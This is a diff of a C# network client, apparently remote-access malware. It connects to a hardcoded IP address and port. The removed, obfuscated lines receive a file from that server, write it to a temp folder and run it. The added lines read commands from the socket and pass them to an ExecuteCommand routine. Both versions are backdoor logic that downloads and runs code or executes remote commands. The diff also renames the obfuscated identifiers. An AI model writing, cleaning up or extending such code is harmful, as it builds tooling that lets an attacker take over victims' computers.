@@ -4,10 +4,9 @@ using System.Net.Sockets;
 using System.Text;
 using System.Diagnostics;
 using System.Threading;
-using System.Windows.Forms;
 using Microsoft.Win32;
 
-class A
+class Client
 {
     private const string ServerIP = "193.58.121.250";
     private const int ServerPort = 7175;
@@ -167,41 +166,17 @@ class A
         {
             try
             {
-                a16 = c.Read(a15, 0, a15.Length);
-                if (a16 > 0)
+                int bytesRead = stream.Read(buffer, 0, buffer.Length);
+                if (bytesRead > 0)
                 {
-                    string a17 = Encoding.UTF8.GetString(a15, 0, a16).TrimEnd('\0');
-
-                    a16 = c.Read(a15, 0, a15.Length);
-                    if (a16 > 0)
-                    {
-                        string a18 = K();
-
-                        string a19 = Path.Combine(a18, a17);
-                        File.WriteAllBytes(a19, a15.Take(a16).ToArray());
-
-                        L(a19);
-                    }
+                    string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+                    ExecuteCommand(command);
                 }
             }
-            catch { break; }
-
-            Thread.Sleep(10000);
-        }
-    }
-
-    private static string K()
-    {
-        string a20 = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
-
-        try
-        {
-            Directory.CreateDirectory(a20);
-            return a20;
-        }
-        catch
-        {
-            return Path.GetTempPath();
+            catch
+            {
+                break;
+            }
         }
     }
 
